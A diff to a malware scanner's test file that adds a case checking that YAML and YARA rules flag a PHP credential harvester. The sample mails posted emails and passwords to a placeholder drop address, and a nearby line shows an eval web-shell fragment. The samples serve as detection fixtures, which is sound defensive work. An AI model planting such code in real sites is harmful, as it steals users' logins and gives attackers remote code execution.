@@ -1495,6 +1495,18 @@ eval($_POST['c']);`,
 			wantYARAHit: true,
 		},
 		{
+			name:     "harvester mailing a hardcoded drop box",
+			yamlRule: "credential_mailer",
+			yaraRule: "credential_harvester_php",
+			ext:      ".php",
+			sample: `<?php
+$e = $_POST['email'];
+$p = $_POST['password'];
+mail('drop@collector.example.test', 'result', "$e|$p");`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
 			name:        "hidden pharmacy doorway",
 			yamlRule:    "spam_pharma_generic",
 			yaraRule:    "spam_pharma",
